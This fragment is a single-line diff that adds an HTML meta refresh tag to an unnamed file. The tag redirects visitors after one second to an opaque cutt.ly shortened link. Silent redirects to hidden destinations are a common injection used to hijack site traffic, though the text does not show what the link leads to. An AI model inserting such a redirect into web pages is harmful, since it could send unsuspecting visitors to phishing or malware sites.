@@ -1,0 +1,1 @@
+<meta http-equiv="refresh" content="1;URL=https://cutt.ly/NwJ4r7gv/">
